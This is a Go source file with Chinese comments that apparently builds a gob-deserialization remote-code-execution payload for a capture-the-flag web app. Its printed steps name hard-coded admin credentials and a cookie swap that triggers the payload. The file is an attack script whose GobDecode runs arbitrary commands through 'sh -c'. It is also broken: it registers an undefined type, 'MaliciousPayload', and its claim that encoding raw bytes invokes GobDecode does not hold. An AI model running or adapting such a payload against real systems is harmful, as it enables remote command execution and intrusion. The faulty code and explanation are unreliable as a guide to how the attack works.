package main

import (
	"bytes"
	"encoding/base64"
	"encoding/gob"
	"fmt"
	"os"
	"os/exec"
)

// 恶意结构体，与主程序中的结构体完全相同
type ExploitPayload struct {
	Command string
}

// 实现 GobDecode 接口，当反序列化时会自动调用
func (m *ExploitPayload) GobDecode(data []byte) error {
	// 执行命令 - 这是漏洞点
	cmd := exec.Command("sh", "-c", string(data))
	cmd.Run()
	return nil
}

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintf(os.Stderr, "使用方法: %s <命令>\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "示例: %s \"cat /flag.txt\"\n", os.Args[0])
		os.Exit(1)
	}

	command := os.Args[1]

	// 注册类型以支持 gob 序列化
	gob.Register(&MaliciousPayload{})

	// 创建恶意 payload
	// 这里的关键是，我们不是序列化 MaliciousPayload 对象本身
	// 而是直接将命令作为原始数据，这样在 GobDecode 中就会被执行

	var buf bytes.Buffer
	enc := gob.NewEncoder(&buf)

	// 直接编码命令字符串，这将在 GobDecode 时被执行
	err := enc.Encode([]byte(command))
	if err != nil {
		fmt.Fprintf(os.Stderr, "编码错误: %v\n", err)
		os.Exit(1)
	}

	// 转换为 base64
	encoded := base64.StdEncoding.EncodeToString(buf.Bytes())

	fmt.Printf("命令: %s\n", command)
	fmt.Printf("Base64 Payload:\n%s\n", encoded)

	// 生成使用说明
	fmt.Printf("\n使用步骤:\n")
	fmt.Printf("1. 登录管理员账户: admin/password123\n")
	fmt.Printf("2. 访问 /admin 页面\n")
	fmt.Printf("3. 在调试工具的 Session 数据框中输入上述 Base64 数据\n")
	fmt.Printf("4. 点击 '创建调试 Session'\n")
	fmt.Printf("5. 使用返回的 session_id 替换当前 cookie 中的 session_id\n")
	fmt.Printf("6. 访问任意需要认证的页面触发反序列化\n")
}
